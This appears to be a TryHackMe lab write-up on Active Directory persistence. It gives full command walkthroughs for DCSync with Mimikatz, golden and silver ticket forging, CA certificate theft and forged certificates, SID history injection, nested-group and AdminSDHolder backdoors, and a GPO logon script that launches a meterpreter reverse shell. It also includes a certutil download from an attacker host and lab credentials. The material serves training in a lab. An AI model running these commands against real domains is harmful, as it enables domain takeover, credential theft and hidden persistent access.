# Persisting Active Directory

# High-Level Overview

Practice common AD persistence techniques that are employed during the post-compromise stage to maintain access to the systems.

## Tools Needed

* Mimikatz
* Rubeus
* ForgeCert
* Microsoft Management Console (MMC)
* Metasploit

## Walkthrough

### Connecting to the Network

* Download the Network VPN Server `Persistingad` configuration file for OpenVPN
* Connect using OpenVPN and the TryHackMe VPN file
	* `sudo openvpn user-persistingad.ovpn`
* Configure the DNS on the host which you are running the VPN connection:
	* Edit the `resolv.conf` file with the command `sudo nano /etc/resolv.conf` and add the line `nameserver 10.200.79.101` at the end of the file.
	* Or use `sudo resolvectl dns persistad 10.200.61.101`
	* `10.200.61.101` is the IP of the `THMDC` in my case.
* Test DNS resolution with the command `nslookup thmdc.za.tryhackme.loc` - this should resolve to the IP of the DC
* Your IP for can be identified using `ip add show persistad` - the inet IP you will use for reverse shells, listeners, etc.

### Requesting Your Credentials

To get the AD credentials required for both SSH and RDP connections to a machine on this network, we need to navigate to `http://distributor.za.tryhackme.loc/creds` and request a credential pair by clicking `Get Credentials`

We can connect using SSH with the following command:

```bash
$ ssh za.tryhackme.loc\\AD_USERNAME@thmwrk1.za.tryhackme.loc
# supply the provided password
```

### Bonus Credentials

This challenge also provides us Domain Administrator (DA) credentials to be used for different tasks together with the generated low-level credentials. The DA account has the details:

* Username: `Administrator`
* Password: `tryhackmewouldnotguess1@`
* Domain: `ZA`

### Task 2

DC Sync All

Connecting to the `THMWRK1` machine using SSH and the DA account:

```bash
$ ssh za.tryhackme.loc\\Administrator@thmwrk1.za.tryhackme.loc
```

Once logged in, start a powershell session and use `Mimikatz` to harvest credentials:

```powershell
> powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

First, performing a DC sync of a single account, our low privilege user:

```powershell
> lsadump::dcsync /domain:za.tryhackme.loc /user:AD_USERNAME
# NTLM hash in my case: 64d1489c0810a90e2c2ad386bcda734e
```

However, to perform a DC sync for every account, we need to enable logging on `Mimikatz`:

```powershell
> log AD_USERNAME_dcdump.txt
```

After the command is completed, we can exit `Mimikatz` and download the `AD_USERNAME_dcdump.txt` file to our attacking machine using scp:

```bash
$ scp Administrator@THMWRK1.za.tryhackme.loc:C:/Users/Administrator.ZA/christine.hall_dcdump.txt .
# christine.hall was the name of my AD Username
```

We can type the command `cat AD_USERNAME_dcdump.txt | grep "SAM Username"` to recover all usernames and `cat AD_USERNAME_dcdump.txt | grep "Hash NTLM"` for all hashes.

To answer the questions, we can perform a DCSync attack for the username of test with the following command:

```powershell
> lsadump::dcsync /domain:za.tryhackme.loc /user:test
```

For the final question, we can perform a DCSync attack for the krbtgt user and get the flag which is the NTLM hash:

```powershell
> lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
# NTLM hash: 16f9af38fca3ada405386b3b57366082
```

### Task 3

For this task we need to generate Golden and Silver Tickets. We need:

* the NTLM hash of the KRBTGT account (which we have from the earlier task)
* the NTLM hash associated with the THMSERVER1 machine account since we need this for the silver ticket (this information can be found in the dcdump file)

Log in over SSH with the low privilege user to gather the domain SID using the command:

```powershell
> Get-ADDomain
# S-1-5-21-3885271727-2693558621-2658995185
```

Start `Mimikatz` again and forge the tickets

```powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
# golden ticket generation - syntax:
# kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
> kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

We can verify it by exiting `Mimikatz` and typing the command:

```powershell
dir \\thmdc.za.tryhackme.loc\c$\
```

Starting `Mimikatz` again, we can forge the Silver tickets with the commands:

```powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
# silver ticket generation - syntax:
# kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
> kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1 /rc4:43460d636f269c709b20049cee36ae7a /service:cifs /ptt
# can get the NTLM hash of the machine account of THMSERVER1 by searching the dump file
# cat christine.hall_dcdump.txt | grep "THMSERVER1" -C 10
```

### Task 4

**Note: The tasks from this point forward do not require actual exploitation of the system since they are highly intrusive and will require a domain rebuild to clear.** In addition, performing the attacks is not required for answering the questions.

Exploit the Certificate Authority (CA) to enable persistance through certificates.

We will use SSH to authenticate to `THMDC` using the Administrator credentials:

```bash
$ ssh za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc
```

Create a unique directory for our user, and we will move into it and run `Mimikatz`:

```powershell
> ssh za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc
> mkdir radupopa
> cd radupopa
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

We will view the certificates stored on the DC:

```powershell
> crypto::certificates /systemstore:local_machine
```

We find a CA certificate on the DC, and we will use `Mimikatz` to make these keys exportable and get them:

```powershell
> privilege::debug
> crypto::capi
> crypto::cng
# export the certificates
> crypto::certificates /systemstore:local_machine /export
```

The exported certificates are stored in `PFX` and `DER` format in our username folder. Now we will download this certificate on our attacking machine using `scp`:

```bash
$ scp Administrator@THMDC.za.tryhackme.loc:C:/Users/Administrator/radupopa/local_machine_My_2_za-THMDC-CA.pfx .
```

We will move this certificate on the `THMWRK` machine:

* On your attacking machine host a Python webserver where the `za-THMDC-CA.pfx` file is located:
	* `python3 -m http.server 80`

* Log in on the `THMWRK` machine using the Administrator account and SSH.
	* `ssh za.tryhackme.loc\\Administrator@thmwrk1.za.tryhackme.loc`
* Use `certutil` to download the file:
	* `certutil.exe -urlcache -split -f http://ATTACKER_IP/local_machine_My_2_za-THMDC-CA.pfx`
	* The password for the `.pfx` file is `mimikatz`

Finally, we will use the certificate to generate our own certificates using `ForgeCert`:

```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_2_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

Use `Rubeus` to request a TGT using the certificate to verify that it's trusted:

```powershell
> C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password1
23 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```

We can now use `Mimikatz` to load the TGT and authenticate to `THMDC`:

```powershell
> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
> kerberos::ptt administrator.kirbi
> exit
```

Check if you have access using `dir`:

```powershell
> dir \\THMDC.za.tryhackme.loc\c$\
```

### Task 5

For this task we will be enabling persistence by forging Security IDentifiers (SID) History.

We will connect using ssh on the `THMDC` machine using the administrator credentials:

```bash
$ ssh za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc
```

We will gather information regarding our low-privilege user SID history:

```powershell
> Get-ADUser christine.hall -properties sidhistory, memberof
# christine.hall is the low privilege AD user in my case
```

Since our user does not have any SID History, we can get the SID of the Domain Admins group, and try to match the SID History:

```powershell
> Get-ADGroup "Domain Admins"
```

We will use `DSInternals` tools to patch the `ntds.file`, the AD database where all information is stored:

```powershell
> Stop-Service -Name ntds -force
> Add-ADDBSidHistory -SamAccountName 'christine.hall' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit
> Start-Service -Name ntds
```

After these steps have been performed, we can ssh into `THMWRK1` with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges:

```bash
$ ssh za.tryhackme.loc\\christine.hall@thmwrk1.za.tryhackme.loc
# christine.hall is the low-privilege AD account in my case
```

Check the SID history with the powershell command:

```powershell
> powershell
> Get-ADUser christine.hall -Properties sidhistory
```

### Task 6

For this task we will practice persistence through group membership, specifically through nested groups.

Log in using ssh and your Administrator credentials on the `THMDC`:

```bash
$ ssh za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc
```

We will start by creating a new base group that we will hide in the People -IT Organisational Unit (OU) - replace `radupopa` with your own username:

```powershell
> New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "radupopa Net Group 1" -SamAccountName "radupopa_nestgroup1" -DisplayName "radupopa Nest Group 1" -GroupScope Global -GroupCategory Security
```

We will also create another group in the People -> Sales OU and add our previous group as member:

```powershell
> New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "radupopa Net Group 2" -SamAccountName "radupopa_nestgroup2" -DisplayName "radupopa Nest Group 2" -GroupScope Global -GroupCategory Security
> Add-ADGroupMember -Identity "radupopa_nestgroup2" -Members "radupopa_nestgroup1"
```

We can do this a couple more times, every time adding the previous group as a member:

```powershell
> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "radupopa Net Group 3" -SamAccountName "radupopa_nestgroup3" -DisplayName "radupopa Nest Group 3" -GroupScope Global -GroupCategory Security
> Add-ADGroupMember -Identity "radupopa_nestgroup3" -Members "radupopa_nestgroup2"
> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "radupopa Net Group 4" -SamAccountName "radupopa_nestgroup4" -DisplayName "radupopa Nest Group 4" -GroupScope Global -GroupCategory Security
> Add-ADGroupMember -Identity "radupopa_nestgroup4" -Members "radupopa_nestgroup3"
> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "radupopa Net Group 5" -SamAccountName "radupopa_nestgroup5" -DisplayName "radupopa Nest Group 5" -GroupScope Global -GroupCategory Security
> Add-ADGroupMember -Identity "radupopa_nestgroup5" -Members "radupopa_nestgroup4"
```

With the last group, let's now add that group to the Domain Admin group:

```powershell
> Add-ADGroupMember -Identity "Domain Admins" -Members "radupopa_nestgroup5"
```

Finally, we can add our low-privileged AD user to the first group we created:

```powershell
> Add-ADGroupMember -Identity "radupopa_nestgroup1" -Members "christine.hall"
```

We can verify our low-privileged user's access to THMDC by connecting using ssh on `THMWRK1`:

```bash
$ ssh za.tryhackme.loc\\christine.hall@thmwrk1.za.tryhackme.loc
# christine.hall is the low-privilege AD account in my case
```

```powershell
> dir \\thmdc.za.tryhackme.loc\c$\ 
```

We can also verify that even if we created multiple groups, the Domain Admins group only has one new member:

```powershell
> Get-ADGroupMember -Identity "Domain Admins"
```

### Task 7

RDP into `THMWRK1` using your low privileged credentials:

```bash
> xfreerdp /v:10.200.61.248 /u:christine.hall /p:Randall1973
# 10.200.61.248 is the IP of the THMWRK1 pc in my case
# christine.hall & Randall1973 are the low priv creds in my case
```

Use `runas` to inject the Administrator credentials, then execute MMC in the `cmd` that spawns:

```powershell
> runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
```

With MMC open, we will add the `Users and Groups Snap-in` (File -> Add Snap-In -> Active Directory Users and Computers). We also need to enable `Advanced Features` (View -> Advanced Features). Now we need to find the `AdminSDHolder` group under Domain -> System.

We will navigate to the `Security` tab of the group by right-clicking the group, selecting `Properties` -> Security

We will add our low-privileged user and grant full Control:

* Click `Add`
* Search for your low-privileged username and click `Check Names`
* Click `OK`
* Click `Allow` on `Full Control`
* Click `Apply`
* Click `OK`

Usually it takes 60 minutes for the Security Descriptor Propagator (SDProp) service to execute and for the user to get full control over all Protected Gropups. But we can enable this progress manually by using the `Invoke-ADSPropagation` tool located on the machine:

```powershell
> cd C:\Tools
> Import-Module .\Invoke-ADSDPropagation.ps1
> Invoke-ADSDPropagation
```

### Task 8

Persistence through Group Policy Objects (GPOs)

We will first use msfvenom to create a shell:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > radupopa_shell.exe
```

Also on the attacking machine, create a script called `radupopa_script.bat` (replace radupopa with your own username):

```bash
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\radupopa_shell.exe C:\tmp\radupopa_shell.exe && timeout /t 20 && C:\tmp\radupopa_shell.exe
```

Still on the attacking machine, use SCP with the Administrator credentials to copy both scripts to the `SYSVOL` directory:

```bash
$ scp radupopa_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
$ scp radupopa_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

The final step is to start a listener using metasploit:

```bash
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

With everything in place, we can create the GPO that will execute it. To do this, we need to RDP into `THMWRK` and use a runas window running as the administrator for the next steps:

```bash
$ xfreerdp /v:10.200.61.248 /u:christine.hall /p:Randall1973
# christine.hall is my low privilege access user
```

```powershell
> runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
# provide the administrator password
```

In this newly spawned `cmd`, we will start `MMC`.

In MMC, we will click on `File` -> `Add/Remove Snap-in` then select the `Group Policy Management` snap-in and click `Add`, followed by clicking `OK`.

In this GPO manager window, we will write a GPO that will be applied to all Admins. Right click on the Admins OU and select `Create a GPO in this domain, and Link it here`. I will name my GPO `radupopa - persisting GPO`.

On this newly created policy, right-click it and select `Enforced`.

Back into the Group Policy Management Editor:

* Under `User Configuration`, expand `Policies -> Windows Settings`
* Select `Scripts (Logon/Logoff)`
* Right-click on Logon -> Properties
* Select the `Scripts` tab
* Click `Add` -> `Browse

We can navigate to where our batch and binary files were, and we will select the `radupopa_script.bat` and click `Open` and `OK`, followed by clicking `Apply` and `OK`. This enables us to get a shell every time on ef the administrators (tier 2, 1 and 0) log into any machine.